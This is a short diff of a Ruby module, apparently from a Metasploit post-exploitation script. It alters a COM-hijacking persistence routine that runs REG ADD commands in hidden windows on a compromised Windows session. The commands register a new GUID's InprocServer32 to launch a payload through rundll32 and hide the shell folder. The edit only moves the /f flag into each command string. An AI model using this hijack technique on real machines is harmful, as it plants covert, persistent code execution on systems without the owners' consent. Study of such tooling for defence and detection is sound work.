@@ -285,11 +285,11 @@ def run
           dll_exe = "rundll32 #{app_path},main"
           Rex::sleep(1.0)
           hacks = [
-            "#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe}",
-            "#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d",
-            "#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment",
-            "#{hive_key}\\#{new_GUID}\\ShellFolder Attributes /t REG_DWORD /d 0xf090013d",
-            "#{hive_key}\\#{new_GUID}\\ShellFolder HideOnDesktop /t REG_SZ /d"
+            "#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe} /f",
+            "#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f",
+            "#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment /f",
+            "#{hive_key}\\#{new_GUID}\\ShellFolder Attributes /t REG_DWORD /d 0xf090013d /f",
+            "#{hive_key}\\#{new_GUID}\\ShellFolder HideOnDesktop /t REG_SZ /d /f"
           ]
         else
           #
@@ -310,7 +310,7 @@ def run
          hacks.each do |cmd|
             begin
               # execute cmd prompt in a hidden channelized windows
-              r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd} /f", nil, {'Hidden' => true, 'Channelized' => true})
+              r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
               print_line("    Hijack: #{cmd}")
  
                 # close client channel when done
